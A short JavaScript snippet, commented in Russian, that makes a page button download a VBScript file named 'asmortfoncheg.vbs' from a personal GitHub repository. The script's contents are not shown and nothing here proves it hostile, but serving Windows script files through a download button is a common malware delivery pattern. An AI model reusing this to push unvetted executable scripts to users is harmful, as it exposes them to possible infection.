document.getElementById('downloadButton').addEventListener('click', function() {
    // Путь к файлу, который нужно скачать
    const fileUrl = 'https://github.com/kubok758/asmortfoncheg/raw/main/asmortfoncheg.vbs';  // Путь к файлу на GitHub
    
    // Создаём временную ссылку для скачивания
    const link = document.createElement('a');
    link.href = fileUrl;
    link.download = 'asmortfoncheg.vbs';  // Имя файла при скачивании
    
    // Инициируем скачивание
    link.click();
});
